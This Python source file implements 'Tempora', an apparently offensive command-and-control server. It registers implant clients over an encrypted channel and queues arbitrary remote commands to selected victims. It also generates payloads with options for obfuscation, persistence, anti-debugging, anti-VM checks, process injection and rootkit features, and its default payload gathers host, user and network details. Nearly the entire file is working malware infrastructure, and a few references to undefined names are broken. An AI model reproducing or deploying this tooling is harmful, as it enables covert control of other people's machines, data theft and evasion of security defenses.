import socket
import threading
import time
import json
import logging
from queue import Queue
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes, hmac
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os
import sys
import argparse

from helpers.formatStrings import bcolors
from helpers.payloadGen import PayloadGenerator

class C2Server:
    def __init__(self, host='0.0.0.0', port=5000, initial_payload=None):
        self.host = host
        self.port = port
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        self.public_key = self.private_key.public_key()
        self.clients = {}
        self.client_lock = threading.Lock()
        self.task_queue = Queue()
        self.task_lock = threading.Lock()  # New lock for task operations
        self.initial_payload = initial_payload  # Store the initial payload
        self.payload_generator = PayloadGenerator()  # Initialize PayloadGenerator
        
        # Ensure logs directory exists
        os.makedirs('../logs', exist_ok=True)
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s: %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler('../logs/c2_server.log')
            ]
        )
        self.logger = logging.getLogger('C2Server')
        self.logger.info("C2 Server initialized")

    def admin_interface(self):
        """Command line interface for sending commands"""
        prompt = f"{bcolors.style(bcolors.BOLD, bcolors.LIGHT_MAGENTA)}Tempora C2 Server > {bcolors.RESET}"
        
        # Command history
        command_history = []
        history_index = 0
        
        # Available commands and their descriptions
        commands = {
            "list": "Show all connected clients",
            "task": "Send task to clients (format: task <type>:<command>)",
            "help": "Show this help message",
            "clear": "Clear the screen",
            "exit": "Exit the server",
            "status": "Show server status",
            "target": "Select target client (format: target <client_id>)",
            "info": "Show detailed client information",
            "kill": "Disconnect a client (format: kill <client_id>)",
            "history": "Show command history",
            "payload": "Generate and send payload (format: payload <options>)"
        }
        
        # Current target client
        current_target = None
        
        def print_help():
            print(f"\n{bcolors.HEADER}Available Commands:{bcolors.RESET}")
            for cmd, desc in commands.items():
                print(f" {bcolors.LIGHT_CYAN}{cmd:<10}{bcolors.RESET} - {desc}")
            print()
        
        def print_status():
            with self.client_lock:
                total_clients = len(self.clients)
                active_clients = sum(1 for client in self.clients.values() 
                                  if time.time() - client['last_activity'] <= 60)
                print(f"\n{bcolors.HEADER}Server Status:{bcolors.RESET}")
                print(f" Total Clients: {bcolors.LIGHT_GREEN}{total_clients}{bcolors.RESET}")
                print(f" Active Clients: {bcolors.LIGHT_GREEN}{active_clients}{bcolors.RESET}")
                print(f" Current Target: {bcolors.LIGHT_CYAN}{current_target if current_target else 'None'}{bcolors.RESET}")
                print()
        
        def print_client_info(client_id):
            with self.client_lock:
                if client_id not in self.clients:
                    print(f"{bcolors.LIGHT_RED}Client {client_id} not found{bcolors.RESET}")
                    return
                
                client = self.clients[client_id]
                last_active = time.time() - client['last_activity']
                status = "Active" if last_active <= 60 else "Inactive"
                status_color = bcolors.LIGHT_GREEN if status == "Active" else bcolors.LIGHT_RED
                
                print(f"\n{bcolors.HEADER}Client Information:{bcolors.RESET}")
                print(f" ID: {bcolors.LIGHT_CYAN}{client_id}{bcolors.RESET}")
                print(f" Status: {status_color}{status}{bcolors.RESET}")
                print(f" Last Active: {bcolors.LIGHT_YELLOW}{last_active:.1f} seconds ago{bcolors.RESET}")
                print()
        
        def generate_payload(options=None):
            """Generate a payload based on options"""
            # Default payload code for demonstration
            default_code = """
import os
import platform
import socket
import uuid

# Get system information
system_info = {
    'hostname': socket.gethostname(),
    'ip': socket.gethostbyname(socket.gethostname()),
    'os': platform.system(),
    'release': platform.release(),
    'version': platform.version(),
    'architecture': platform.machine(),
    'processor': platform.processor(),
    'username': os.getlogin(),
    'mac': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                     for elements in range(0, 8*6, 8)][::-1])
}

# Print system information
print("System Information:")
for key, value in system_info.items():
    print(f"{key}: {value}")

# Return the information
system_info
"""
            
            # Parse options if provided
            if options:
                try:
                    # Example format: obfuscation=2,encrypt=true,anti_vm=true
                    feature_dict = {}
                    option_parts = options.split(',')
                    
                    for part in option_parts:
                        if '=' in part:
                            key, value = part.split('=', 1)
                            key = key.strip()
                            value = value.strip()
                            
                            # Convert string values to appropriate types
                            if value.lower() == 'true':
                                value = True
                            elif value.lower() == 'false':
                                value = False
                            elif value.isdigit():
                                value = int(value)
                            
                            feature_dict[key] = value
                    
                    # Generate the payload with specified options
                    print(f"{bcolors.LIGHT_GREEN}Generating payload with options: {feature_dict}{bcolors.RESET}")
                    payload = self.payload_generator.generate_c2_ready_payload(default_code, feature_dict)
                
                except Exception as e:
                    print(f"{bcolors.LIGHT_RED}Error parsing payload options: {e}{bcolors.RESET}")
                    print(f"{bcolors.LIGHT_YELLOW}Using default options instead.{bcolors.RESET}")
                    payload = self.payload_generator.generate_c2_ready_payload(default_code)
            else:
                # Generate payload with default options
                print(f"{bcolors.LIGHT_YELLOW}Using default payload options.{bcolors.RESET}")
                payload = self.payload_generator.generate_c2_ready_payload(default_code)
            
            return payload
        
        def print_payload_options():
            """Display available payload configuration options"""
            print(f"\n{bcolors.HEADER}Payload Generation Options:{bcolors.RESET}")
            print(f"\nFormat: {bcolors.LIGHT_CYAN}payload [option1=value1,option2=value2,...]{bcolors.RESET}")
            print(f"\n{bcolors.LIGHT_GREEN}Available Options:{bcolors.RESET}")
            
            options = [
                ("obfuscation_level", "1-3", "Level of code obfuscation"),
                ("encrypt", "true/false", "Encrypt the payload"),
                ("compress", "true/false", "Compress the payload"),
                ("persistence", "true/false", "Enable persistence mechanism"),
                ("persistence_method", "registry/startup/service", "Method of persistence"),
                ("network", "true/false", "Enable network functionality"),
                ("protocol", "http/tcp/udp", "Network protocol to use"),
                ("host", "hostname/IP", "Target host for network operations"),
                ("port", "port number", "Port for network operations"),
                ("anti_debug", "true/false", "Enable anti-debugging features"),
                ("anti_vm", "true/false", "Enable anti-VM detection"),
                ("process_injection", "true/false", "Enable process injection"),
                ("target_process", "process name", "Target process for injection"),
                ("rootkit", "true/false", "Enable rootkit features"),
                ("c2", "true/false", "Enable command & control features"),
                ("c2_servers", "server1:port,server2:port", "C2 server addresses"),
                ("fallback_interval", "seconds", "C2 server fallback interval")
            ]
            
            for option, value_type, description in options:
                print(f" {bcolors.LIGHT_CYAN}{option:<20}{bcolors.RESET} {bcolors.LIGHT_YELLOW}{value_type:<25}{bcolors.RESET} {description}")
            
            print(f"\n{bcolors.LIGHT_GREEN}Example:{bcolors.RESET}")
            print(f" {bcolors.LIGHT_CYAN}payload obfuscation_level=2,encrypt=true,anti_debug=true{bcolors.RESET}")
            print()
        
        while True:
            try:
                # Update prompt with current target
                if current_target:
                    current_prompt = f"{bcolors.style(bcolors.BOLD, bcolors.LIGHT_MAGENTA)}Tempora C2 Server [{current_target}] > {bcolors.RESET}"
                else:
                    current_prompt = prompt
                
                command = input(current_prompt).strip()
                
                # Handle empty command
                if not command:
                    continue
                
                # Add to history
                command_history.append(command)
                history_index = len(command_history)
                
                # Split command into parts
                parts = command.split()
                cmd = parts[0].lower()
                
                if cmd == "help":
                    print_help()
                
                elif cmd == "list":
                    with self.client_lock:
                        print(f"\n{bcolors.HEADER}Connected clients:{bcolors.RESET}")
                        for client_id, client_info in self.clients.items():
                            last_active = time.time() - client_info['last_activity']
                            status = "Active" if last_active <= 60 else "Inactive"
                            status_color = bcolors.LIGHT_GREEN if status == "Active" else bcolors.LIGHT_RED
                            
                            print(f" {bcolors.LIGHT_CYAN}-{bcolors.RESET} {bcolors.LIGHT_GREEN}{client_id}{bcolors.RESET} [{status_color}{status}{bcolors.RESET}]")
                    print()
                
                elif cmd == "task":
                    if len(parts) < 2:
                        print(f"{bcolors.LIGHT_RED}Invalid task format. Use: task <type>:<command>{bcolors.RESET}")
                        continue
                    
                    try:
                        task_type, *payload = parts[1].split(":", 1)
                        task = {
                            'type': task_type,
                            'cmd': payload[0] if payload else None,
                            'timestamp': time.time(),
                            'target': current_target  # Add target information
                        }
                        self.add_task(task)
                        print(f"{bcolors.LIGHT_GREEN}Task sent successfully{bcolors.RESET}")
                    except Exception as e:
                        self.logger.error(f"{bcolors.LIGHT_RED}Invalid task format: {e}{bcolors.RESET}")
                
                elif cmd == "payload":
                    # Check if user just wants to see payload options
                    if len(parts) > 1 and parts[1].lower() == "help":
                        print_payload_options()
                        continue
                    
                    if not current_target:
                        print(f"{bcolors.LIGHT_RED}No target selected. Use 'target <client_id>' first.{bcolors.RESET}")
                        continue
                    
                    with self.client_lock:
                        if current_target not in self.clients:
                            print(f"{bcolors.LIGHT_RED}Target client {current_target} not found{bcolors.RESET}")
                            continue
                    
                    # Get payload options if provided
                    options = None
                    if len(parts) > 1:
                        options = ' '.join(parts[1:])
                    
                    # Generate the payload
                    print(f"{bcolors.LIGHT_YELLOW}Generating payload...{bcolors.RESET}")
                    payload_code = generate_payload(options)
                    
                    # Send the payload to the client
                    task = {
                        'type': 'initial_payload',
                        'payload': payload_code,
                        'timestamp': time.time(),
                        'target': current_target
                    }
                    
                    self.add_task(task)
                    print(f"{bcolors.LIGHT_GREEN}Payload sent to client {current_target}{bcolors.RESET}")
                    print(f"{bcolors.LIGHT_YELLOW}The client will report back execution results.{bcolors.RESET}")
                
                elif cmd == "clear":
                    print("\033[H\033[J")  # Clear screen
                
                elif cmd == "exit":
                    print(f"{bcolors.LIGHT_YELLOW}Shutting down server...{bcolors.RESET}")
                    break
                
                elif cmd == "status":
                    print_status()
                
                elif cmd == "target":
                    if len(parts) < 2:
                        print(f"{bcolors.LIGHT_RED}Please specify a client ID{bcolors.RESET}")
                        continue
                    
                    target_id = parts[1]
                    with self.client_lock:
                        if target_id in self.clients:
                            current_target = target_id
                            print(f"{bcolors.LIGHT_GREEN}Target set to: {target_id}{bcolors.RESET}")
                        else:
                            print(f"{bcolors.LIGHT_RED}Client {target_id} not found{bcolors.RESET}")
                
                elif cmd == "info":
                    if len(parts) < 2:
                        if current_target:
                            print_client_info(current_target)
                        else:
                            print(f"{bcolors.LIGHT_RED}No target selected. Use: info <client_id>{bcolors.RESET}")
                    else:
                        print_client_info(parts[1])
                
                elif cmd == "kill":
                    if len(parts) < 2:
                        print(f"{bcolors.LIGHT_RED}Please specify a client ID{bcolors.RESET}")
                        continue
                    
                    client_id = parts[1]
                    with self.client_lock:
                        if client_id in self.clients:
                            try:
                                self.clients[client_id]['socket'].close()
                            except:
                                pass
                            del self.clients[client_id]
                            print(f"{bcolors.LIGHT_GREEN}Client {client_id} disconnected{bcolors.RESET}")
                            if current_target == client_id:
                                current_target = None
                        else:
                            print(f"{bcolors.LIGHT_RED}Client {client_id} not found{bcolors.RESET}")
                
                elif cmd == "history":
                    print(f"\n{bcolors.HEADER}Command History:{bcolors.RESET}")
                    for i, cmd in enumerate(command_history[-10:], 1):  # Show last 10 commands
                        print(f" {bcolors.LIGHT_CYAN}{i}.{bcolors.RESET} {cmd}")
                    print()
                
                else:
                    print(f"{bcolors.LIGHT_RED}Unknown command: {cmd}{bcolors.RESET}")
                    print(f"Type {bcolors.LIGHT_CYAN}help{bcolors.RESET} for available commands")
                
            except KeyboardInterrupt:
                print(f"\n{bcolors.LIGHT_YELLOW}Shutting down admin interface{bcolors.RESET}")
                break
            except Exception as e:
                self.logger.error(f"Admin interface error: {e}")
    
    def get_public_key_pem(self):
        return self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    
    def decrypt_asymmetric(self, encrypted_message):
        try:
            decrypted = self.private_key.decrypt(
                encrypted_message,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            return decrypted
        except Exception as e:
            self.logger.error(f"{bcolors.LIGHT_RED}Asymmetric Decryption Error: {e}{bcolors.RESET}")
            raise
    
    def start(self):
        """Start the C2 server - alias for start_server for testing compatibility"""
        self.start_server()
    
    def start_server(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        
        self.logger.info(f"Server listening on {bcolors.LIGHT_YELLOW}{self.host}:{self.port}{bcolors.RESET}")
        
        threading.Thread(target=self.task_dispatcher, daemon=True).start()
        
        while True:
            try:
                client_socket, address = server_socket.accept()
                self.logger.info(f"Connection from {bcolors.LIGHT_CYAN}{address}{bcolors.RESET}")
                threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, address),
                    daemon=True
                ).start()
            except Exception as e:
                self.logger.error(f"{bcolors.LIGHT_RED}Server accept error: {e}{bcolors.RESET}")
    
    def handle_client(self, client_socket, address):
        """Handle a new client connection."""
        self.logger.info(f"New connection from {address}")
        
        try:
            # Wait for CLIENT_READY
            client_ready = client_socket.recv(1024)
            if client_ready != b'CLIENT_READY':
                raise ValueError("Client not ready for key exchange")
            
            # Send READY_FOR_KEY_EXCHANGE
            client_socket.sendall(b'READY_FOR_KEY_EXCHANGE')
            
            # Send server public key
            client_socket.sendall(self.get_public_key_pem())
            
            # Receive key lengths
            symmetric_key_length = int(client_socket.recv(10).decode())
            hmac_key_length = int(client_socket.recv(10).decode())
            
            # Receive encrypted keys
            encrypted_symmetric_key = client_socket.recv(symmetric_key_length)
            encrypted_hmac_key = client_socket.recv(hmac_key_length)
            
            # Decrypt keys
            symmetric_key = self.decrypt_asymmetric(encrypted_symmetric_key)
            hmac_key = self.decrypt_asymmetric(encrypted_hmac_key)
            
            # Send key exchange complete
            client_socket.sendall(b'KEY_EXCHANGE_COMPLETE')
            
            # Register client
            client_id = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
            
            with self.client_lock:
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': address,
                    'symmetric_key': symmetric_key,
                    'hmac_key': hmac_key,
                    'last_activity': time.time()
                }
            
            self.logger.info(f"Client {client_id} registered successfully")
            
            # Start client communication thread
            threading.Thread(
                target=self.handle_client_communication,
                args=(client_id,),
                daemon=True
            ).start()
            
        except Exception as e:
            self.logger.error(f"Error handling client {address}: {str(e)}")
            client_socket.close()
    
    def handle_client_communication(self, client_id):
        try:
            with self.client_lock:
                client_info = self.clients.get(client_id)
                if not client_info:
                    return
                client_socket = client_info['socket']
                symmetric_key = client_info['symmetric_key']
                hmac_key = client_info['hmac_key']
            
            cipher = Fernet(symmetric_key)
            
            while True:
                try:
                    length_bytes = client_socket.recv(4)
                    if len(length_bytes) != 4:
                        break
                    data_length = int.from_bytes(length_bytes, byteorder='big')
                    
                    encrypted_data = b''
                    while len(encrypted_data) < data_length:
                        chunk = client_socket.recv(data_length - len(encrypted_data))
                        if not chunk:
                            break
                        encrypted_data += chunk
                    
                    if len(encrypted_data) != data_length:
                        break
                    
                    encrypted_hmac = client_socket.recv(32)
                    if len(encrypted_hmac) != 32:
                        break
                    
                    h = hmac.HMAC(hmac_key, hashes.SHA256())
                    h.update(encrypted_data)
                    try:
                        h.verify(encrypted_hmac)
                    except Exception:
                        continue
                    
                    decrypted_data = cipher.decrypt(encrypted_data).decode()
                    request = json.loads(decrypted_data)
                    
                    # Handle specific request types
                    request_type = request.get('type')
                    request_data = request.get('data', {})
                    
                    response = None
                    
                    if request_type == 'status':
                        response = {
                            'status': 'online',
                            'clients': len(self.clients),
                            'tasks': self.task_queue.qsize()
                        }
                    
                    elif request_type == 'clients':
                        response = {
                            'clients': [
                                {
                                    'id': cid,
                                    'address': info['address'],
                                    'last_activity': info['last_activity']
                                }
                                for cid, info in self.clients.items()
                            ]
                        }
                    
                    elif request_type == 'client_info':
                        client_id = request_data.get('client_id')
                        if client_id in self.clients:
                            client_info = self.clients[client_id]
                            response = {
                                'id': client_id,
                                'address': client_info['address'],
                                'last_activity': client_info['last_activity']
                            }
                    
                    elif request_type == 'create_task':
                        task = {
                            'type': 'command',
                            'command': request_data.get('command'),
                            'target': request_data.get('client_id'),
                            'timestamp': time.time()
                        }
                        self.add_task(task)
                        response = {'success': True, 'task': task}
                    
                    elif request_type == 'tasks':
                        response = {
                            'tasks': list(self.task_queue.queue)
                        }
                    
                    elif request_type == 'generate_payload':
                        payload = self.payload_generator.generate_c2_ready_payload(
                            default_code,
                            request_data
                        )
                        response = {'payload': payload}
                    
                    # Send response back to client
                    if response is not None:
                        encrypted_response = cipher.encrypt(
                            json.dumps(response).encode()
                        )
                        h = hmac.HMAC(hmac_key, hashes.SHA256())
                        h.update(encrypted_response)
                        response_hmac = h.finalize()
                        
                        data_length = len(encrypted_response).to_bytes(4, 'big')
                        client_socket.sendall(data_length)
                        client_socket.sendall(encrypted_response)
                        client_socket.sendall(response_hmac)
                    
                    # Update client's last activity timestamp
                    with self.client_lock:
                        if client_id in self.clients:
                            self.clients[client_id]['last_activity'] = time.time()
                
                except Exception as e:
                    self.logger.error(f"Error handling client {client_id}: {str(e)}")
                    break
            
            # Clean up client connection
            with self.client_lock:
                if client_id in self.clients:
                    del self.clients[client_id]
            client_socket.close()
            
        except Exception as e:
            self.logger.error(f"Error in client communication thread: {str(e)}")
    
    def task_dispatcher(self):
        last_heartbeat = 0
        while True:
            try:
                # Check if we need to send heartbeats
                current_time = time.time()
                if current_time - last_heartbeat > 15:  # Send heartbeat every 15 seconds
                    heartbeat_task = {
                        'type': 'heartbeat',
                        'timestamp': current_time
                    }
                    with self.client_lock:
                        clients_to_remove = []
                        for client_id, client_info in list(self.clients.items()):
                            try:
                                # Check if client is still active
                                if current_time - client_info['last_activity'] > 60:  # 60 seconds timeout
                                    clients_to_remove.append(client_id)
                                    continue

                                encrypted_task = Fernet(client_info['symmetric_key']).encrypt(
                                    json.dumps(heartbeat_task).encode()
                                )
                                h = hmac.HMAC(client_info['hmac_key'], hashes.SHA256())
                                h.update(encrypted_task)
                                task_hmac = h.finalize()
                                
                                data_length = len(encrypted_task).to_bytes(4, 'big')
                                client_info['socket'].sendall(data_length)
                                client_info['socket'].sendall(encrypted_task)
                                client_info['socket'].sendall(task_hmac)
                                
                                # Update last activity time
                                client_info['last_activity'] = current_time
                            except Exception as e:
                                self.logger.error(f"{bcolors.LIGHT_RED}Failed to send heartbeat to {client_id}: {e}{bcolors.RESET}")
                                clients_to_remove.append(client_id)
                        
                        # Remove inactive clients
                        for client_id in clients_to_remove:
                            if client_id in self.clients:
                                try:
                                    self.clients[client_id]['socket'].close()
                                except:
                                    pass
                                del self.clients[client_id]
                    
                    last_heartbeat = current_time

                # Process tasks from queue
                if not self.task_queue.empty():
                    with self.task_lock:
                        task = self.task_queue.get()
                    
                    with self.client_lock:
                        clients_to_remove = []
                        
                        # Check if this task is targeted to a specific client
                        target_client_id = task.get('target')
                        
                        # If targeted, only send to that client; otherwise, send to all clients
                        clients_to_process = []
                        if target_client_id:
                            if target_client_id in self.clients:
                                clients_to_process = [(target_client_id, self.clients[target_client_id])]
                            else:
                                self.logger.error(f"{bcolors.LIGHT_RED}Target client {target_client_id} not found{bcolors.RESET}")
                                continue
                        else:
                            clients_to_process = list(self.clients.items())
                        
                        for client_id, client_info in clients_to_process:
                            try:
                                # Check if client is still active
                                if current_time - client_info['last_activity'] > 60:  # 60 seconds timeout
                                    clients_to_remove.append(client_id)
                                    continue

                                encrypted_task = Fernet(client_info['symmetric_key']).encrypt(
                                    json.dumps(task).encode()
                                )
                                h = hmac.HMAC(client_info['hmac_key'], hashes.SHA256())
                                h.update(encrypted_task)
                                task_hmac = h.finalize()
                                
                                data_length = len(encrypted_task).to_bytes(4, 'big')
                                client_info['socket'].sendall(data_length)
                                client_info['socket'].sendall(encrypted_task)
                                client_info['socket'].sendall(task_hmac)
                                
                                # Update last activity time
                                client_info['last_activity'] = current_time
                                
                                # Log sending task to specific client
                                if target_client_id:
                                    self.logger.info(f"Task {task.get('type')} sent to target client {client_id}")
                            except Exception as e:
                                self.logger.error(f"{bcolors.LIGHT_RED}Failed to send task to {client_id}: {e}{bcolors.RESET}")
                                clients_to_remove.append(client_id)
                        
                        # Remove inactive clients
                        for client_id in clients_to_remove:
                            if client_id in self.clients:
                                try:
                                    self.clients[client_id]['socket'].close()
                                except:
                                    pass
                                del self.clients[client_id]
                
                time.sleep(1)
            except Exception as e:
                self.logger.error(f"{bcolors.LIGHT_RED}Task dispatcher error: {e}{bcolors.RESET}")
                time.sleep(5)
    
    def add_task(self, task):
        with self.task_lock:
            self.task_queue.put(task)
        self.logger.info(f"Task added: {task}")

    def send_payload_to_client(self, client_id, code, features=None):
        """Generate and send a payload to a specific client."""
        try:
            with self.client_lock:
                if client_id not in self.clients:
                    self.logger.error(f"Client {client_id} not found")
                    return False
                
                # Generate the payload using PayloadGenerator
                payload_task = self.payload_generator.generate_c2_ready_payload(
                    code,
                    features=features or {}
                )
                
                # Send the task to the client
                return self.send_task_to_client(client_id, payload_task)
                
        except Exception as e:
            self.logger.error(f"Error sending payload to client {client_id}: {str(e)}")
            return False

def main():
    parser = argparse.ArgumentParser(description='Tempora C2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    parser.add_argument('--initial-payload', type=str, help='Path to initial payload file to send to clients on connection')
    
    args = parser.parse_args()
    
    # Load initial payload if specified
    initial_payload = None
    if args.initial_payload:
        try:
            with open(args.initial_payload, 'r') as f:
                initial_payload = f.read()
            print(f"Loaded initial payload from {args.initial_payload}")
        except Exception as e:
            print(f"Error loading initial payload: {e}")
            sys.exit(1)
    
    # Initialize server with optional initial payload
    server = C2Server(host=args.host, port=args.port, initial_payload=initial_payload)
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=server.start_server, daemon=True)
    server_thread.start()
    
    # Start admin interface in main thread
    server.admin_interface()

if __name__ == '__main__':
    main()